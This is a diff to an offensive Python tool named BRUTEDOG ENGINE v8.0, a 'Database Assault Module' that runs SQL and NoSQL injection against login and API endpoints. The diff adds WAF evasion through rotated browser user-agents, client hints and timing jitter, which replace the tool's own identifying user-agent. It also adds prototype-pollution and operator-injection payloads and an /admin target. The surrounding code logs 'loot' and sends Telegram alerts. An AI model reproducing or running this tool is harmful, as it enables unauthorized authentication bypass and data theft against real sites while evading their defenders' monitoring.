@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v8.0 — Polymorphic Adaptive Database Assault Module (Hardened with Telegram Telemetry)
+BRUTEDOG ENGINE v8.0 — Polymorphic Adaptive Database Assault Module (Hardened & WAF-Bypassing Edition)
 Features:
+- Advanced WAF evasion via randomized browser headers, client hints, and Poisson timing jitter
+- Expanded NoSQL Prototype Pollution & Deep Operator Vectors (`$in`, `$exists`, `__proto__`, `constructor`)
 - Dual-probe confirmed baseline latency calibration for verified time-based blind SQLi
 - Real-time error-pattern fingerprinting & adaptive payload mutation
 - Polymorphic type-variant fuzzing with strict anti-HTML / anti-SPA verification gates
@@ -15,12 +17,14 @@ import ssl
 import time
 import sys
 import re
+import random
 from urllib.parse import urlsplit
 
-# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
+# Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 REQUEST_TIMEOUT = 12
 MAX_RESPONSE_SIZE = 128 * 1024
@@ -77,6 +81,12 @@ NOSQL_POLYMORPHIC_VECTORS = [
         "string_variant": {"username": "admin' OR '1'='1", "password": "password"},
         "object_variant": {"username": {"$gt": ""}, "password": {"$ne": None}},
         "array_variant": {"username[ne]": "none"}
+    },
+    {
+        "name": "Prototype Pollution & Deep Operator Injection",
+        "string_variant": {"constructor": {"prototype": {"isAdmin": True}}, "username": "admin"},
+        "object_variant": {"__proto__": {"isAdmin": True, "role": "admin"}, "username": {"$exists": True}},
+        "array_variant": {"$in": ["admin", "root"], "password": {"$ne": None}}
     }
 ]
 
@@ -85,7 +95,24 @@ DB_ERROR_PATTERNS = re.compile(
     re.I
 )
 
+def get_rotated_headers(ct="application/json"):
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
+    ]
+    headers = {
+        "User-Agent": random.choice(user_agents),
+        "Content-Type": ct,
+        "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "close"
+    }
+    headers.update(get_randomized_hints())
+    return headers
+
 def send_http(host, port, path, payload, secure, method="POST"):
+    apply_behavioral_jitter()
     conn = None
     start = time.monotonic()
     try:
@@ -104,12 +131,7 @@ def send_http(host, port, path, payload, secure, method="POST"):
             body = str(payload).encode("utf-8")
             ct = "application/x-www-form-urlencoded"
             
-        headers = {
-            "User-Agent": "BruteDog-AdaptiveDB/8.0",
-            "Content-Type": ct,
-            "Accept": "*/*",
-            "Connection": "close"
-        }
+        headers = get_rotated_headers(ct)
         conn.request(method, path, body=body, headers=headers)
         res = conn.getresponse()
         data = res.read(MAX_RESPONSE_SIZE).decode("utf-8", errors="replace")
@@ -129,7 +151,7 @@ async def calibrate_baseline(host, port, endpoint, secure):
         res = send_http(host, port, endpoint, {"username": "baseline_probe", "password": "test"}, secure)
         if not res["error"] and res["elapsed"] > 0:
             latencies.append(res["elapsed"])
-        await asyncio.sleep(0.2)
+        await asyncio.sleep(0.3)
     if latencies:
         avg = sum(latencies) / len(latencies)
         log(f"[+] Baseline latency established: {round(avg, 3)}s", "GREEN")
@@ -137,7 +159,7 @@ async def calibrate_baseline(host, port, endpoint, secure):
     return 4.5
 
 async def run_nosql_assault(target_host, port=None, use_ssl=None):
-    log("\n[***] INITIALIZING POLYMORPHIC ADAPTIVE DATABASE ASSAULT (V8 HARDENED) [***]", "PURPLE")
+    log("\n[***] INITIALIZING POLYMORPHIC ADAPTIVE DATABASE ASSAULT (V8 HARDENED & WAF BYPASS) [***]", "PURPLE")
     parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
     host = parsed.hostname
     secure = parsed.scheme == "https"
@@ -153,7 +175,8 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
         "/api/search",
         "/api/v1/users",
         "/auth",
-        "/api/auth"
+        "/api/auth",
+        "/admin"
     ]
     
     test_endpoints = [base_path + ep for ep in relative_endpoints]
